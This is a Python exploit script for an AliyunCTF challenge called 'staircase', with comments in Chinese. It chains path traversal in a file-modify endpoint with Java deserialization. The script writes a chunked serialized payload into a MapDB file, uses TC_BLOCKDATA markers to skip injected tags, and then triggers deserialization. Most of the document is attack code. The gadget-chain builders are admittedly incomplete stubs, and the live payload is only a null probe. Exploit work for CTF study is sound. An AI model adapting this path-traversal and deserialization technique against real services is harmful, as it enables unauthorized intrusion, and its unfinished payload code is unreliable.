#!/usr/bin/env python3
"""
CTF Challenge: staircase - AliyunCTF
Exploit using TC_BLOCKDATA chain technique

漏洞：路径穿越 + Java 反序列化
利用技术：通过 TC_BLOCKDATA 吸收 <start>/<end> 标签

每次写入格式: <start>(7) + DATA(8) + <end>(5) = 20 bytes
通过在 DATA 最后放 77 0C (TC_BLOCKDATA 12)，可以让反序列化器跳过 <end><start>
"""

import requests
import base64
import struct
import sys


def build_guava_gadget(command):
    """
    Build Guava 19.0 gadget chain
    基于 ysoserial 的 JDK7u21 变体，使用 Guava 的 Ordering$ArbitraryOrdering
    
    这是简化版本 - 实际需要完整的 gadget chain
    """
    # 由于构建完整 gadget 很复杂，这里提供一个 URLDNS 探测 payload
    # URLDNS 不需要依赖链，只使用 JDK 内置类
    return build_urldns_payload(command)


def build_urldns_payload(url):
    """
    Build URLDNS payload - 仅用于探测，不执行代码
    会触发 DNS 查询到指定 URL
    """
    # Java 序列化格式的 URLDNS payload
    # 这个 payload 会在反序列化时触发对 URL 的 DNS 查询
    
    # 简化的 HashMap + URL payload
    # 实际的 payload 结构更复杂
    
    # 这是一个预构建的 URLDNS payload 模板
    # 需要替换 URL 部分
    
    # 由于手工构建很繁琐，让我们使用一个最小的 payload
    # 这个 payload 创建一个会触发 hashCode() 的 HashMap
    
    url_bytes = url.encode('utf-8')
    url_len = len(url_bytes)
    
    # 构建序列化流
    payload = bytearray()
    
    # Stream header
    payload += b'\xac\xed\x00\x05'
    
    # TC_OBJECT
    payload += b'\x73'
    
    # TC_CLASSDESC for java.util.HashMap
    payload += b'\x72'  # TC_CLASSDESC
    payload += struct.pack('>H', 17)  # class name length
    payload += b'java.util.HashMap'
    payload += struct.pack('>q', 0x0507dac1c31660d1)  # serialVersionUID
    payload += b'\x03'  # flags: SC_SERIALIZABLE | SC_WRITE_METHOD
    payload += struct.pack('>H', 2)  # field count
    
    # Field 1: loadFactor (float)
    payload += b'F'  # type code
    payload += struct.pack('>H', 10)  # name length
    payload += b'loadFactor'
    
    # Field 2: threshold (int)
    payload += b'I'  # type code
    payload += struct.pack('>H', 9)  # name length
    payload += b'threshold'
    
    # TC_ENDBLOCKDATA + TC_NULL (superclass)
    payload += b'\x78\x70'
    
    # Field values
    payload += struct.pack('>f', 0.75)  # loadFactor
    payload += struct.pack('>i', 0)  # threshold
    
    # writeObject data: size=1, entry=(URL, URL)
    payload += struct.pack('>i', 1)  # buckets
    payload += struct.pack('>i', 1)  # size
    
    # 由于完整构建太复杂，返回一个最小可用的序列化数据
    # 实际的 URLDNS payload 需要 ~400 bytes
    
    return bytes(payload)


def build_minimal_payload():
    """
    构建一个最小的会触发异常的 payload
    用于验证写入是否成功
    """
    payload = bytearray()
    payload += b'\xac\xed\x00\x05'  # stream magic + version
    payload += b'\x70'  # TC_NULL - 返回 null
    return bytes(payload)


def build_blockdata_chain(payload_data):
    """
    将 payload 拆分成 6-byte 块，每块后面加 77 0C (blockdata 12)
    
    返回: list of 8-byte DATA blocks
    """
    blocks = []
    i = 0
    
    while i < len(payload_data):
        chunk = payload_data[i:i+6]
        if len(chunk) < 6:
            # 最后一块，需要填充
            chunk = chunk + b'\x00' * (6 - len(chunk))
        
        # 如果还有更多数据，添加 blockdata 跳过指令
        if i + 6 < len(payload_data):
            block = chunk + b'\x77\x0c'  # TC_BLOCKDATA 12
        else:
            # 最后一块，不需要跳过
            block = chunk + b'\x00\x00'
        
        blocks.append(block)
        i += 6
    
    return blocks


class StaircaseExploit:
    def __init__(self, url):
        self.url = url.rstrip('/')
        self.session = requests.Session()
    
    def upload(self, content, filename="test.bin"):
        files = {'file': (filename, content, 'application/octet-stream')}
        return self.session.post(f"{self.url}/files/upload", files=files, timeout=10)
    
    def modify(self, path, data, offset):
        if len(data) > 8:
            data = data[:8]
        payload = {
            "fileName": path,
            "data": base64.b64encode(data).decode(),
            "offset": offset
        }
        return self.session.put(f"{self.url}/files/modify", json=payload, timeout=10)
    
    def get_icon(self):
        return self.session.get(f"{self.url}/files/icon", timeout=30)
    
    def write_chain(self, mapdb_path, target_offset, data_blocks):
        """
        使用 blockdata chain 写入多个数据块
        
        target_offset: 第一个 DATA 应该落在的位置
        data_blocks: list of 8-byte blocks
        """
        write_offset = target_offset - 7  # <start> 在 DATA 前面 7 字节
        
        for i, block in enumerate(data_blocks):
            actual_offset = write_offset + i * 20
            print(f"  Write {i}: offset={actual_offset} (0x{actual_offset:x}), data={block.hex()}")
            
            resp = self.modify(mapdb_path, block, actual_offset)
            if not resp or resp.status_code != 200:
                print(f"  [-] Write {i} failed!")
                return False
        
        return True
    
    def exploit(self, mapdb_path, target_offset=0x100250):
        print("=" * 60)
        print(" Staircase Exploit - TC_BLOCKDATA Chain")
        print("=" * 60)
        print(f"Target: {self.url}")
        print(f"MapDB: {mapdb_path}")
        print(f"Target offset: 0x{target_offset:x}")
        print()
        
        # Step 1: 上传初始文件
        print("[1] Uploading initial file...")
        resp = self.upload(b"X" * 512)
        if not resp or resp.status_code != 200:
            print("[-] Upload failed")
            return False
        print("[+] Upload OK")
        
        # Step 2: 构建 payload
        print("[2] Building payload...")
        
        # 使用最小 payload 进行测试
        # 返回 null 会导致 ClassCastException
        raw_payload = build_minimal_payload()
        print(f"  Raw payload: {raw_payload.hex()}")
        print(f"  Payload size: {len(raw_payload)} bytes")
        
        # 拆分成 blockdata chain
        blocks = build_blockdata_chain(raw_payload)
        print(f"  Split into {len(blocks)} blocks")
        
        # Step 3: 写入 chain
        print("[3] Writing blockdata chain...")
        if not self.write_chain(mapdb_path, target_offset, blocks):
            print("[-] Chain write failed")
            return False
        print("[+] Chain write OK")
        
        # Step 4: 触发
        print("[4] Triggering deserialization...")
        resp = self.get_icon()
        print(f"  Response: {resp.status_code if resp else 'None'}")
        if resp and resp.status_code != 200:
            print(f"  Body: {resp.text[:500]}")
        
        return True


def main():
    if len(sys.argv) < 3:
        print(f"""
Usage: {sys.argv[0]} <url> <mapdb_path> [target_offset]

Example:
    python {sys.argv[0]} http://localhost:8080 ../../../tmp/mapdb123temp
    python {sys.argv[0]} http://localhost:8080 ../../../tmp/mapdb123temp 0x100250

To find MapDB path:
    docker exec <container> ls /tmp/mapdb*
        """)
        sys.exit(1)
    
    url = sys.argv[1]
    mapdb_path = sys.argv[2]
    target_offset = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x100250
    
    exp = StaircaseExploit(url)
    exp.exploit(mapdb_path, target_offset)


if __name__ == "__main__":
    main()
